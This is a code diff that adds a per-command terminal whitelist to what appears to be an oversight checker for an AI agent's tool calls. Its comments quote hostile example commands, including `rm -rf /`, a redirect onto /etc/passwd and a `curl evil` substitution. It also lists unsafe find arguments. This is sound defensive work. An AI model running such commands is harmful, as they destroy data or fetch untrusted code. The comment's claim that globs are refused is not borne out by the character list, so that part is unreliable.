@@ -73,6 +73,7 @@ no net at all.
 
 import json
 import re
+import shlex
 import time
 
 import provider
@@ -292,6 +293,119 @@ def _compose(prompt, call_text, extra):
 
 # ---- the check itself -------------------------------------------------------
 
+# ---------------------------------------------------------------------------
+# The terminal whitelist
+#
+# The tool whitelist above trusts a whole TOOL, which is no use for the
+# terminal: "run any command on this computer" is not a thing to trust
+# wholesale, but `ls` and `git status` are, and those are most of what the
+# terminal is actually asked to do. Without this every one of them costs a
+# full round trip to the checking model before anything runs - on the tool
+# that gets called more than all the others put together.
+#
+# So the terminal is trusted per COMMAND. settings' "terminal_whitelist" is a
+# list of commands that may run unasked; a call whose every command is on it
+# skips the model, and anything else goes to the model exactly as before.
+#
+# The rules are deliberately narrow, because the failure that matters here is
+# a dangerous command talked past the list rather than a safe one sent to the
+# model unnecessarily:
+#
+#   - the command is split on the shell's own separators (&& || ; | and
+#     newlines) and EVERY piece has to be on the list. `ls && rm -rf /` is two
+#     commands and the second one decides it.
+#   - an entry matches on whole leading words, so "git status" allows exactly
+#     that and not `git push`, and "ls" does not allow `lsof`.
+#   - anything that can reach outside the command being read is refused
+#     outright: redirection, command substitution, background, globs into a
+#     shell that expands them. See _SHELL_CHARS.
+#   - a few arguments turn a reading command into a writing one - find's
+#     -exec and -delete above all - and are refused wherever they appear.
+#
+# Anything this cannot parse with certainty (unbalanced quotes, an empty
+# piece) is not on the list, and goes to the model. "I could not tell" and
+# "it is fine" must never be the same answer.
+
+# Characters that give a command a reach beyond itself. Checked on the raw
+# text of each piece AFTER the separators above have been split off, so a `|`
+# or `&&` between two whitelisted commands is fine while a stray `&` or any
+# `>` is not.
+#
+#   > <   redirection - `cat x > /etc/passwd` reads and then writes
+#   $ `   substitution - `cat $(curl evil)` runs something the list never saw
+#   &     background, once && has been split off - work that outlives the check
+#   \n    a second command by another name, and _pieces splits on it anyway
+#   (){}  subshells and brace expansion
+_SHELL_CHARS = "><$`&(){}"
+
+# Arguments that turn a reading command into one that writes or runs something
+# else. Matched as whole arguments, so a FILE called "-delete" is not one of
+# these and neither is `grep -- --delete`.
+_UNSAFE_ARGS = {"-exec", "-execdir", "-ok", "-okdir", "-delete", "-fprint",
+                "-fprintf", "-fls", "--exec"}
+
+# Where one command ends and the next begins. Longest first, so && is never
+# read as two &.
+_SEPARATORS = ("&&", "||", ";", "|", "\n")
+
+
+def _pieces(command):
+    """`command` split into the individual commands it actually runs."""
+    parts = [command]
+    for sep in _SEPARATORS:
+        parts = [bit for part in parts for bit in part.split(sep)]
+    return [p.strip() for p in parts]
+
+
+def _listed(words, allowed):
+    """Whether `words` (one command, already tokenised) starts with any entry
+    on `allowed` - matched whole word by whole word, so "git status" allows
+    `git status --short` and nothing else that begins with "git"."""
+    for entry in allowed:
+        wanted = entry.split()
+        if wanted and words[:len(wanted)] == wanted:
+            return True
+    return False
+
+
+def terminal_allowed(call, allowed):
+    """Whether this terminal call is one the whitelist says can just run.
+
+    False for every call this cannot be certain about, which includes every
+    call that is not the terminal, an empty whitelist, and anything it cannot
+    parse. The caller sends those to the checking model, which is exactly
+    what happened before this existed."""
+    if not allowed or (call.get("tool") or "").lower() != "terminal":
+        return False
+    args = call.get("args") or {}
+    command = args.get("command")
+    if not isinstance(command, str) or not command.strip():
+        return False
+    # `input` writes into whatever is sitting at the prompt - a password, a
+    # y/N, a line for a REPL - and what that reaches is the running program,
+    # not `command`. There is nothing here to check it against, so a call
+    # carrying one is the model's to judge however harmless `command` looks.
+    if args.get("input") is not None:
+        return False
+
+    for piece in _pieces(command):
+        if not piece:
+            return False            # `ls &&` - malformed, so not understood
+        if any(ch in piece for ch in _SHELL_CHARS):
+            return False
+        try:
+            words = shlex.split(piece)
+        except ValueError:
+            return False            # unbalanced quotes - not parseable, not trusted
+        if not words:
+            return False
+        if any(w in _UNSAFE_ARGS for w in words):
+            return False
+        if not _listed(words, allowed):
+            return False
+    return True
+
+
 def check(call, threshold, prompt=None, extra=None):
     """(outcome, reason) for one tool call - outcome being RUN, ASK or SKIP,
     and reason the one line to show beside it.
@@ -338,6 +452,16 @@ def check(call, threshold, prompt=None, extra=None):
             _note("blacklisted phrase: " + phrase + " - asking")
             return ASK, ("This call names a blocked phrase (" + phrase
                          + ") from the safety tab.")
+
+    # Terminal commands the settings page says can just run. AFTER the
+    # blacklist, unlike the tool whitelist above, and the difference is
+    # deliberate: a blacklisted phrase is the user saying "never this without
+    # asking me", and a list of ordinary commands must not be able to talk
+    # over it. Before the thresholds, because being on the list is an answer
+    # at every level from 1 to 9 - the same as being a whitelisted tool.
+    if terminal_allowed(call, _entries(chosen["terminal_whitelist"])):
+        _note("whitelisted command: " + text + " - allowed")
+        return RUN, "whitelisted terminal command"
 
     # The two ends never reach the checking model. There is no rating it could
     # give that would change the answer, so asking for one would be a paid
